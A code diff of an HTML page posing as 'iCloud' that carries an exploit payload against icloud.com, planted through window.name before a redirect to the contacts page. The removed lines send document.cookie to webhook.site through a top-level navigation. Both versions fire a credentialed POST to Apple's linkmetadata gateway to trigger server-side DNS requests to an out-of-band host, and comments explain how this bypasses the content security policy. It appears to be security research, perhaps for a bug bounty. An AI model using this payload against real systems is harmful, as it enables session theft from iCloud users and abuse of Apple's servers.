@@ -3,18 +3,20 @@
 <head><title>iCloud</title></head>
 <body>
 <script>
-// Minimal test: does Function(name)() execute and can it navigate out?
-// Also fires SSRF OOB via gateway.icloud.com (bypasses connect-src restriction)
-var TS = Date.now();
-var HTTP_OOB = 'https://webhook.site/oob';
-var DNS_OOB  = 'oob.dnshook.site';
-
-window.name =
-  // 1. HTTP exfil via top-level navigation (no connect-src restriction)
-  'window.top.location.href=' + JSON.stringify(HTTP_OOB + '?xss=1&ts=' + TS + '&c=') + '+encodeURIComponent(document.cookie).slice(0,500);' +
-  // 2. SSRF DNS OOB via linkmetadata — Apple server fires outbound DNS
-  // connect-src allows *.icloud.com so this fetch is CSP-permitted
-  'try{fetch("https://gateway.icloud.com/rsvp/events/v1/linkmetadata/",{method:"POST",credentials:"include",headers:{"Content-Type":"application/json"},body:JSON.stringify({url:"https://xss.' + TS + '.' + DNS_OOB + '"})});}catch(e){}';
+// Diagnostic: if contacts page turns RED → Function(name)() ran + window.name survived
+// If stays white → window.name was cleared before mandrill fired
+window.name = [
+  // Visible DOM test (no network needed)
+  'document.body.style.background="red";',
+  'document.title="XSS_FIRED";',
+  // SSRF DNS OOB via Apple server (connect-src *.icloud.com allowed)
+  'try{fetch("https://gateway.icloud.com/rsvp/events/v1/linkmetadata/",',
+  '{method:"POST",credentials:"include",',
+  'headers:{"Content-Type":"application/json"},',
+  'body:JSON.stringify({url:"https://xss.', Date.now(), '.oob.dnshook.site"})});}catch(e){}',
+  // HTTP nav OOB
+  'window.top.location.href="https://webhook.site/oob?xss=fired&t=', Date.now(), '";'
+].join('');
 
 location.href = 'https://www.icloud.com/contacts/';
 </script>
